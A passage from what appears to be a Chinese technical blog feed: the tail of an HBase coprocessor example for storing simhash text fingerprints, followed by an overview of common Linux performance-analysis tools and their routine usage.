     <span class="token keyword">if</span> <span class="token punctuation">(</span>cells <span class="token operator">==</span> null <span class="token operator">||</span> cells<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String simhash__itemid <span class="token operator">=</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneValue</span><span class="token punctuation">(</span>cells<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>simhash__itemid<span class="token punctuation">)</span><span class="token operator">||</span>simhash__itemid<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String simhash <span class="token operator">=</span> simhash__itemid<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        String itemid <span class="token operator">=</span> simhash__itemid<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"__"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取Put Rowkey</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> row <span class="token operator">=</span> put<span class="token punctuation">.</span><span class="token function">getRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 通过Rowkey构造Get对象</span>        Get get <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Get</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">;</span>        get<span class="token punctuation">.</span><span class="token function">setMaxVersions</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        get<span class="token punctuation">.</span><span class="token function">addFamily</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Result result <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRegion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>        Cell columnCell <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getColumnLatestCell</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// set size</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>columnCell <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 第一次存储数据，将size初始化为1</span>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"第一次存储数据，将size初始化为1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            JsonObject jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsonObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span>simhash<span class="token punctuation">,</span>itemid<span class="token punctuation">)</span><span class="token punctuation">;</span>            Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String json <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>            put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// json 数组</span>            put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 初始化</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sizebyte <span class="token operator">=</span> CellUtil<span class="token punctuation">.</span><span class="token function">cloneValue</span><span class="token punctuation">(</span>columnCell<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> size <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>sizebyte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"非第一次存储数据 ----> Rowkey `"</span><span class="token operator">+</span>Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"` simhash set size is : "</span><span class="token operator">+</span>size <span class="token operator">+</span><span class="token string">", the current value is : "</span><span class="token operator">+</span>simhash__itemid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Cell cell1 <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getColumnLatestCell</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String jsonBefore <span class="token operator">=</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneValue</span><span class="token punctuation">(</span>cell1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                JsonObject jsonObject <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>jsonBefore<span class="token punctuation">,</span> JsonObject<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> sizeBefore <span class="token operator">=</span> jsonObject<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>size<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>jsonObject<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>simhash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>sizeBefore<span class="token operator">==</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            JsonObject jsonone <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsonObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            jsonone<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span>simhash<span class="token punctuation">,</span>itemid<span class="token punctuation">)</span><span class="token punctuation">;</span>                            String jsonstrone <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>jsonone<span class="token punctuation">)</span><span class="token punctuation">;</span>                            put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token operator">+</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>jsonstrone<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// json 数组</span>                            put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 初始化</span>                        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                            jsonObject<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span>simhash<span class="token punctuation">,</span>itemid<span class="token punctuation">)</span><span class="token punctuation">;</span>                            String jsonAfter <span class="token operator">=</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>                            put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token operator">+</span>size<span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>jsonAfter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// json 数组</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>jsonObject<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>simhash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如此，当我们需要对某一文本指纹与库中数据进行比对时，只需一个Table.Get(List) 操作即可返回所有的数据，然后基于s0依次获取各个 Set 集合中的数据即可。</p><p>下面我们算一笔账，假设我们某主题类型数据依然有 2^37 条数据（1375亿数据），假设数据均匀分布，则每个16位（16个01数字随机组成的组合为2^16 个）倒排返回的最大数量为 (2^37) * 4 / (2^16) =8388608个候选结果，即每行约839个 Set 集合，每个Set 集合大约1M 的话，数据存储量也必然不会太大。</p><p>你如果有十种不同主题的数据，HBase 行数无非也才 (2^16)*10 = 655360 行而已。</p><p>如果再加上 Snappy 压缩呢？<br>如果再加上 Fast-Diff 编码呢？<br>如果再开启 Mob 对象存储呢？ 每个 Set 是不是可以存10万个键值对？每行只需90个 Set 集合。</p><p>也或许，如果数据量小的话，使用 Redis 是不是更好呢？</p><p>总之，优化完善和不完美的地方还很多，本文也就简单叙述到此，如果您有好的建议或是不同看法，<strong>欢迎留言哦！感恩~</strong> </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>1.<a href="https://blog.csdn.net/u010454030/article/details/49102565" target="_blank" rel="noopener">https://blog.csdn.net/u010454030/article/details/49102565</a><br>2.<a href="http://www.lanceyan.com/tech/arch/simhash_hamming_distance_similarity2-html.html" target="_blank" rel="noopener">http://www.lanceyan.com/tech/arch/simhash_hamming_distance_similarity2-html.html</a><br>3.<a href="https://cloud.tencent.com/developer/news/218062" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/218062</a><br>4.<a href="https://blog.csdn.net/qq_36142114/article/details/80540303" target="_blank" rel="noopener">https://blog.csdn.net/qq_36142114/article/details/80540303</a><br>5.<a href="https://blog.csdn.net/u011467621/article/details/49685107" target="_blank" rel="noopener">https://blog.csdn.net/u011467621/article/details/49685107</a> </p><p>转载自：<a href="https://mp.weixin.qq.com/s/UZmksFBTKFzF4jrXGnw2fg" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux性能分析工具汇总合集</title>
      <link href="/2019/03/11/chang-yong-gong-ju/linux-xing-neng-fen-xi-gong-ju-hui-zong-he-ji/"/>
      <url>/2019/03/11/chang-yong-gong-ju/linux-xing-neng-fen-xi-gong-ju-hui-zong-he-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux性能分析工具汇总合集"><a href="#Linux性能分析工具汇总合集" class="headerlink" title="Linux性能分析工具汇总合集"></a>Linux性能分析工具汇总合集</h1><p>出于对Linux操作系统的兴趣，以及对底层知识的强烈欲望，因此整理了这篇文章。本文也可以作为检验基础知识的指标，另外文章涵盖了一个系统的方方面面。如果没有完善的计算机系统知识，网络知识和操作系统知识，文档中的工具，是不可能完全掌握的，另外对系统性能分析和优化是一个长期的系列。</p><p>本文档主要是结合Linux 大牛，Netflix 高级性能架构师 Brendan Gregg 更新 Linux 性能调优工具的博文，搜集Linux系统性能优化相关文章整理后的一篇综合性文章，主要是结合博文对涉及到的原理和性能测试的工具展开说明。</p><p>背景知识：具备背景知识是分析性能问题时需要了解的。比如硬件 cache；再比如操作系统内核。应用程序的行为细节往往是和这些东西互相牵扯的，这些底层的东西会以意想不到的方式影响应用程序的性能，比如某些程序无法充分利用 cache，从而导致性能下降。比如不必要地调用过多的系统调用，造成频繁的内核 / 用户切换等。这里只是为本文的后续内容做一些铺垫，关于调优还有很多东西，我所不知道的比知道的要多的多，希望大家能共同学习进步。</p><h2 id="【性能分析工具】"><a href="#【性能分析工具】" class="headerlink" title="【性能分析工具】"></a><strong>【性能分析工具】</strong></h2><p>首先来看一张图：</p><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_3c65934a804b2cd6ec6dab02ccb33457.png" alt="img"></p><p>上图是Brendan Gregg 的一次性能分析的分享，这里面的所有工具都可以通过man来获得它的帮助文档，下问简单介绍介绍一下常规的用法：</p><h3 id="vmstat–虚拟内存统计"><a href="#vmstat–虚拟内存统计" class="headerlink" title="vmstat–虚拟内存统计"></a><strong>vmstat–虚拟内存统计</strong></h3><p>vmstat(VirtualMeomoryStatistics,虚拟内存统计) 是Linux中监控内存的常用工具,可对操作系统的虚拟内存、进程、CPU等的整体情况进行监视。<br>vmstat的常规用法：vmstat interval times即每隔interval秒采样一次，共采样times次，如果省略times,则一直采集数据，直到用户手动停止为止。<br>简单举个例子：</p><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_a40dd34e45c0a8cc36b775bef97506c3.png" alt="img"></p><p>可以使用ctrl+c停止vmstat采集数据。<br>第一行显示了系统自启动以来的平均值，第二行开始显示现在正在发生的情况，接下来的行会显示每5秒间隔发生了什么，每一列的含义在头部，如下所示：</p><p>▪ procs：r这一列显示了多少进程在等待cpu，b列显示多少进程正在不可中断的休眠（等待IO）。</p><p>▪ memory：swapd列显示了多少块被换出了磁盘（页面交换），剩下的列显示了多少块是空闲的（未被使用），多少块正在被用作缓冲区，以及多少正在被用作操作系统的缓存。</p><p>▪ swap：显示交换活动：每秒有多少块正在被换入（从磁盘）和换出（到磁盘）。</p><p>▪ io：显示了多少块从块设备读取（bi）和写出（bo）,通常反映了硬盘I/O。</p><p>▪ system：显示每秒中断(in)和上下文切换（cs）的数量。</p><p>▪ cpu：显示所有的cpu时间花费在各类操作的百分比，包括执行用户代码（非内核），执行系统代码（内核），空闲以及等待IO。</p><p>内存不足的表现：free  memory急剧减少，回收buffer和cacher也无济于事，大量使用交换分区（swpd）,页面交换（swap）频繁，读写磁盘数量（io）增多，缺页中断（in）增多，上下文切换（cs）次数增多，等待IO的进程数（b）增多，大量CPU时间用于等待IO（wa）</p><h3 id="iostat–用于报告中央处理器统计信息"><a href="#iostat–用于报告中央处理器统计信息" class="headerlink" title="iostat–用于报告中央处理器统计信息"></a><strong>iostat–用于报告中央处理器统计信息</strong></h3><p>iostat用于报告中央处理器（CPU）统计信息和整个系统、适配器、tty 设备、磁盘和 CD-ROM 的输入/输出统计信息，默认显示了与vmstat相同的cpu使用信息，使用以下命令显示扩展的设备统计：</p><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_6f5752047fa040731b77d6ba862fd5a5.png" alt="img"></p><p>第一行显示的是自系统启动以来的平均值，然后显示增量的平均值，每个设备一行。</p><p>常见linux的磁盘IO指标的缩写习惯：rq是request,r是read,w是write,qu是queue，sz是size,a是verage,tm是time,svc是service。</p><p>▪rrqm/s和wrqm/s：每秒合并的读和写请求，“合并的”意味着操作系统从队列中拿出多个逻辑请求合并为一个请求到实际磁盘。</p><p>▪r/s和w/s：每秒发送到设备的读和写请求数。</p><p>▪rsec/s和wsec/s：每秒读和写的扇区数。</p><p>▪avgrq –sz：请求的扇区数。</p><p>▪avgqu –sz：在设备队列中等待的请求数。</p><p>▪await：每个IO请求花费的时间。</p><p>▪svctm：实际请求（服务）时间。</p><p>▪%util：至少有一个活跃请求所占时间的百分比。</p><h3 id="dstat–系统监控工具"><a href="#dstat–系统监控工具" class="headerlink" title="dstat–系统监控工具"></a><strong>dstat–系统监控工具</strong></h3><p>dstat显示了cpu使用情况，磁盘io情况，网络发包情况和换页情况，输出是彩色的，可读性较强，相对于vmstat和iostat的输入更加详细且较为直观。在使用时，直接输入命令即可，当然也可以使用特定参数。</p><p>如下：dstat –cdlmnpsy</p><p><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_415d0b90111fc6e985ea98225a2fe153.png" alt="img"></p><h3 id="iotop–LINUX进程实时监控工具"><a href="#iotop–LINUX进程实时监控工具" class="headerlink" title="iotop–LINUX进程实时监控工具"></a><strong>iotop–LINUX进程实时监控工具</strong></h3><p>iotop命令是专门显示硬盘IO的命令，界面风格类似top命令，可以显示IO负载具体是由哪个进程产生的。是一个用来监视磁盘I/O使用状况的top类工具，具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。<br>可以以非交互的方式使用：iotop –bod interval，查看每个进程的I/O，可以使用pidstat，pidstat –d instat。</p><h3 id="pidstat–监控系统资源情况"><a href="#pidstat–监控系统资源情况" class="headerlink" title="pidstat–监控系统资源情况"></a><strong>pidstat–监控系统资源情况</strong></h3><p>pidstat主要用于监控全部或指定进程占用系统资源的情况,如CPU,内存、设备IO、任务切换、线程等。</p><p>使用方法：pidstat –d interval；pidstat还可以用以统计CPU使用信息：pidstat –u interval；统计内存信息：Pidstat –r interval。</p><h3 id="top"><a href="#top" class="headerlink" title="top"></a><strong>top</strong></h3><p>top命令的汇总区域显示了五个方面的系统性能信息：</p><p>1.负载：时间，登陆用户数，系统平均负载；</p><p>2.进程：运行，睡眠，停止，僵尸；</p><p>3.cpu:用户态，核心态，NICE,空闲，等待IO,中断等；</p><p>4.内存：总量，已用，空闲（系统角度），缓冲，缓存；</p><p>5.交换分区：总量，已用，空闲</p><p>任务区域默认显示：进程ID,有效用户，进程优先级，NICE值，进程使用的虚拟内存，物理内存和共享内存，进程状态，CPU占用率，内存占用率，累计CPU时间，进程命令行信息。</p><h3 id="htop"><a href="#htop" class="headerlink" title="htop"></a><strong>htop</strong></h3><p>htop 是Linux系统中的一个互动的进程查看器,一个文本模式的应用程序(在控制台或者X终端中),需要ncurses。<br><img src="http://rdc.hundsun.com/portal/data/upload/201705/f_6e4bec6db5920ed79698a73ecc402fa9.png" alt="img"></p><p>Htop可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。</p><p>与top相比，htop有以下优点：</p><p>▪ 可以横向或者纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。</p><p>▪ 在启动上，比top更快。</p><p>▪ 杀进程时不需要输入进程号。</p><p>▪ htop支持鼠标操作。</p><h3 id="mpstat"><a href="#mpstat" class="headerlink" title="mpstat"></a><strong>mpstat</strong></h3><p>mpstat 是Multiprocessor Statistics的缩写，是实时系统监控工具。其报告与CPU的一些统计信息，这些信息存放在/proc/stat文件中。在多CPUs系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。常见用法：mpstat –P ALL interval times。</p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a><strong>netstat</strong></h3><p>Netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p><p>▲常见用法： </p><p>netstat –npl   可以查看你要打开的端口是否已经打开。</p><p>netstat –rn    打印路由表信息。</p><p>netstat –in    提供系统上的接口信息，打印每个接口的MTU,输入分组数，输入错误，输出分组数，输出错误，冲突以及当前的输出队列的长度。</p><h3 id="ps–显示当前进程的状态"><a href="#ps–显示当前进程的状态" class="headerlink" title="ps–显示当前进程的状态"></a><strong>ps–显示当前进程的状态</strong></h3><p>ps参数太多，具体使用方法可以参考man ps，常用的方法：ps  aux  #hsserver；ps –ef |grep #hundsun</p><p>▪ 杀掉某一程序的方法：ps  aux | grep mysqld | grep –v grep | awk ‘{print $2 }’ xargs kill -9</p><p>▪ 杀掉僵尸进程：ps –eal | awk ‘{if ($2 == “Z”){print $4}}’ | xargs kill -9</p><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a><strong>strace</strong></h3><p>跟踪程序执行过程中产生的系统调用及接收到的信号，帮助分析程序或命令执行中遇到的异常情况。</p><p>举例：查看mysqld在linux上加载哪种配置文件，可以通过运行下面的命令：strace –e stat64 mysqld –print –defaults &gt; /dev/null</p><h3 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a><strong>uptime</strong></h3><p>能够打印系统总共运行了多长时间和系统的平均负载，uptime命令最后输出的三个数字的含义分别是1分钟，5分钟，15分钟内系统的平均负荷。</p><h3 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a><strong>lsof</strong></h3><p>lsof(list open files)是一个列出当前系统打开文件的工具。通过lsof工具能够查看这个列表对系统检测及排错，常见的用法：</p><p>查看文件系统阻塞  lsof /boot</p><p>查看端口号被哪个进程占用   lsof  -i : 3306</p><p>查看用户打开哪些文件   lsof –u username</p><p>查看进程打开哪些文件   lsof –p  4838</p><p>查看远程已打开的网络链接  lsof –i @192.168.34.128</p><h3 id="perf"><a href="#perf" class="headerlink" title="perf"></a><strong>perf</strong></h3><p>perf是Linux kernel自带的系统性能优化工具。优势在于与Linux Kernel的紧密结合，它可以最先应用到加入Kernel的new feature，用于查看热点函数，查看cashe miss的比率，从而帮助开发者来优化程序性能。<br>性能调优工具如 perf，Oprofile 等的基本原理都是对被监测对象进行采样，最简单的情形是根据 tick 中断进行采样，即在 tick 中断内触发采样点，在采样点里判断程序当时的上下文。假如一个程序 90% 的时间都花费在函数 foo() 上，那么 90% 的采样点都应该落在函数 foo() 的上下文中。运气不可捉摸，但我想只要采样频率足够高，采样时间足够长，那么以上推论就比较可靠。因此，通过 tick 触发采样，我们便可以了解程序中哪些地方最耗时间，从而重点分析。<br>想要更深的了解本工具可以参考：<br><a href="http://blog.csdn.net/trochiluses/article/details/10261339" target="_blank" rel="noopener">http://blog.csdn.net/trochiluses/article/details/10261339</a></p><p>汇总：结合以上常用的性能测试命令并联系文初的性能分析工具的图，就可以初步了解到性能分析过程中哪个方面的性能使用哪方面的工具（命令）。</p><h2 id="【常用的性能测试工具】"><a href="#【常用的性能测试工具】" class="headerlink" title="【常用的性能测试工具】"></a><strong>【常用的性能测试工具】</strong></h2><p>熟练并精通了第二部分的性能分析命令工具，引入几个性能测试的工具，介绍之前先简单了解几个性能测试工具：</p><p>▪ perf_events: 一款随 Linux 内核代码一同发布和维护的性能诊断工具，由内核社区维护和发展。Perf 不仅可以用于应用程序的性能统计分析，也可以应用于内核代码的性能统计和分析。</p><p>更多参考：<a href="http://blog.sina.com.cn/s/blog_98822316010122ex.html。" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_98822316010122ex.html。</a><br>▪ eBPF tools: 一款使用bcc进行的性能追踪的工具,eBPF map可以使用定制的eBPF程序被广泛应用于内核调优方面，也可以读取用户级的异步代码。重要的是这个外部的数据可以在用户空间管理。这个k-v格式的map数据体是通过在用户空间调用bpf系统调用创建、添加、删除等操作管理的。more: <a href="http://blog.csdn.net/ljy1988123/article/details/50444693。" target="_blank" rel="noopener">http://blog.csdn.net/ljy1988123/article/details/50444693。</a><br>▪ perf-tools: 一款基于 perf_events (perf) 和 ftrace 的Linux性能分析调优工具集。Perf-Tools 依赖库少，使用简单。支持Linux 3.2 及以上内核版本。more: <a href="https://github.com/brendangregg/perf-tools。">https://github.com/brendangregg/perf-tools。</a><br>▪ bcc(BPF Compiler Collection): 一款使用eBPF的perf性能分析工具。一个用于创建高效的内核跟踪和操作程序的工具包，包括几个有用的工具和示例。利用扩展的BPF（伯克利数据包过滤器），正式称为eBPF，一个新的功能，首先被添加到Linux 3.15。多用途需要Linux 4.1以上BCC。</p><p>更多参考：<a href="https://github.com/iovisor/bcc#tools。">https://github.com/iovisor/bcc#tools。</a><br>▪ ktap: 一种新型的linux脚本动态性能跟踪工具。允许用户跟踪Linux内核动态。ktap是设计给具有互操作性，允许用户调整操作的见解，排除故障和延长内核和应用程序。它类似于Linux和Solaris DTrace SystemTap。更多参考： <a href="https://github.com/ktap/ktap。">https://github.com/ktap/ktap。</a><br>▪ Flame Graphs:是一款使用perf,system tap,ktap可视化的图形软件，允许最频繁的代码路径快速准确地识别，可以是使用github.com/brendangregg/flamegraph中的开发源代码的程序生成。</p><p>更多参考：<a href="http://www.brendangregg.com/flamegraphs.html。" target="_blank" rel="noopener">http://www.brendangregg.com/flamegraphs.html。</a></p><h3 id="一、-Linux-observability-tools-Linux-性能观测工具"><a href="#一、-Linux-observability-tools-Linux-性能观测工具" class="headerlink" title="一、 Linux observability tools | Linux 性能观测工具"></a><strong>一、 Linux observability tools | Linux 